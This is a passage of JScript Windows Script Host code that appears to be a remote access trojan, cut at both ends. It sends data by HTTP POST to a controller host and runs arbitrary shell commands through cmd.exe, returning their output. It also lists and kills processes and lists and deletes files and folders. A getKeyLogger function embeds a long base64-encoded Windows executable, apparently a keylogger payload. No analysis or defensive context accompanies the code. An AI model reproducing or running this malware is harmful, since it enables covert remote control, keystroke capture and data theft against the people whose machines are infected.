		var httpobj = WScript.CreateObject("msxml2.xmlhttp");
		httpobj.open("post","http://" + host + ":" + port +"/" + retcmd, false);
		httpobj.setRequestHeader("user-agent:", information());
		httpobj.send(buffer);
	}catch(er){
		updatestatus("Upload+Failed");
	}
}


function deletefaf (url){
try{
filesystemobj.deleteFile(url);
filesystemobj.deleteFolder(url);
}catch(err){}
}

function cmdshell (cmd){
var httpobj,oexec,readallfromany;
var strsaveto = installdir + "out.txt";
shellobj.run("%comspec% /c " + cmd + " > \"" + strsaveto + "\"", 0, true);
readallfromany = filesystemobj.openTextFile(strsaveto).readAll();
try{
filesystemobj.deleteFile(strsaveto);
}catch(ee){}
return readallfromany;
}


function enumprocess(){
    var ep = "";
try{
var objwmiservice = GetObject("winmgmts:\\\\.\\root\\cimv2");
var colitems = objwmiservice.ExecQuery("select * from win32_process",null,48);

for(var fi = new Enumerator(colitems); !fi.atEnd(); fi.moveNext()){
    var objitem = fi.item();
	ep = ep + objitem.name + "^";
	ep = ep + objitem.processId + "^";
    ep = ep + objitem.executablePath + spliter;
}
}catch(er){}
return ep;
}

function exitprocess (pid){
try{
shellobj.run("taskkill /F /T /PID " + pid,0,true);
}catch(err){}
}

function getParentDirectory(path){
	var fo = filesystemobj.getFile(path);
	return filesystemobj.getParentFolderName(fo);
}

function enumfaf (enumdir){
    var re = "";
try{
    for(var fi = new Enumerator(filesystemobj.getFolder (enumdir).subfolders); !fi.atEnd(); fi.moveNext()){
        var folder = fi.item();
        re = re + folder.name + "^^d^" + folder.attributes + spliter; 
    }
    for(var fi = new Enumerator(filesystemobj.getFolder (enumdir).files); !fi.atEnd(); fi.moveNext()){
        var file = fi.item();
        re = re + file.name + "^" + file.size + "^" + file.attributes + spliter; 
    }
}catch(err){}
return re;
}

function getKeyLogger(){
	var encoded = "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AAADAHIEAAAEAJMHAAAFANoFAAAGAOsFAAABAJMHAAACAAgGAAABAGwEAAACAE8EAAADAHIEAAAEAJMHAAABAJkFAAACAKYFAAABAGwEAAACAE8EAAADAHIEAAAEAJMHAAAFANoFAAAGAOsFAAABAJMHAAACAAgGAAABAGwEAAACAE8EAAADAHIEAAAEAJMHAAABAIsIAAABAL8IAAABAEAJAAABAEAJAAABAGwEAAACAE8EAAADAHIEAAAEAJMHAAABAGwEAAACAE8EAAADAHIEAAAEAJMHAAABABgSAAABAD8KAAABAD8KAAABAD8KAAABAD8KAAABAD8KAAABAD8KAAABAD8KAAABADoMAAABAFQMAAABAGkMAAABAIIMAAACAIgMAAADAJEMAAABAL0MAAACAMYMAAADANAMAiAEANsMAAAFAOIMAAAGAOoMAAAHAJEMAAABAP4MAAACAAANAAABAEINAAACAEcNAAABAGMNAiACAGgNAAADAHENAAABAEINAAABAFcIAAABAJ8NAAACAKENAAABAEINCQDWARMAwQDWAfUC0QDWAQQD2QDWARMAEQDWARMA4QDWARMANADWARMAPADWARMARADWARMATADWARMAVADWARMANACjA6EAPACjA6EARACjA6EATACjA6EAVACjA6EA6QDWARMA8QDWARMA+QDWAV4DCQEbD7cDOQA8D7sDMQBOD4wAIQFnD8MDKQHWAV4DMQDWARMAMQCTD8oDMQGhD9ADOQHGD9sDQQHWD+IDQQHpD5oAKQHWAegDOQH1DxcAMQAHEPADSQEYEBMAGQDWARMAUQFPEAgEGQB4A4wAGQCBA5EAGQCaA5oAWQHWAR4EYQHWARMAXACzA6YAaQHWAfkEcQHWARMAZADWARMAbADWARMAeQH2EK8AZAD8EJEAZAAGEZEAZAATERMFSQAcEbcDZAAoERkFZAAxESAFZAA9EY8CSQDWAfADZACTDyYFeQFKEa8AbABODz0FgQFWEQQCbACTD0MFiQHWARMAbAATEUsFeQCaA5oAkQF5EVIFmQF4A2IFbAAHED0FUQCHEW8FUQAHEG8FGQCSA5UAoQGXEXgFgQGmEd8CgQGmEYsFgQGyEZAFqQHWAV4DsQHWARMAuQHWAaMFyQHWARMAmQDWARMA2QFLErcFmQBVErwFGQFdEsIF4QFtEskF4QF3Es8FmQCOEtUF6QGYEtsF6QGeEhMA8QHWAQUB0QHWAeMF0QGwEhMA+QFKERcAsQC2EhMA+QG7EhcA+QHIEvcFGQFdEvsFCQLsEgEGCQIBEwYGAQIREw0GAQKaAxMGGQIgE5EAIQIuEyAGKQLWAQUB0QHWASYG0QGwEvADmQBVExMAAQJoEzwGSQKCE0MGuQDWAY8CuQAGEZEAgQGmEZ0CuQCaA5oAWQKdE7cFEQCrE0oGYQK4E7cDYQLIE7cDaQLjE1AG2QGaA1cGSQLnE1wGYQL5E7cDGQEKFJEAGQFdEmIGWQIVFGoG2QGaA28GkQAaFJEAkQAgFJEAcQLWARMAeQLWAV4DGQBaFKEGOQBzFKcGoQDWAa0GiQKNFAwHsQDWARMAsQATERoH2QFLEh8HsQAoESQHkQLWAV4DmQLWARMAuQDWAbwFoQLWAaMHsQLWARMAuQLWAa4HyQLWAY8C0QLWARMA2QLWAV4D4QLWAV4D6QLWAV4D8QLWAV4D+QLWAV4DAQPWAV4DCQPWAV4DEQPWAV4DCAA8ACMBCABAACgBCABEAC0BCABIADIBCABMADcBCABQADwBCABUAEEBCABYAEYBCABcAEsBCABgAFABCABkAFUBCABoAFoBCABsAF8BCABwAGQBCAB0AGkBCAB8AHIBCACAAHcBCACEAHwBCACIAI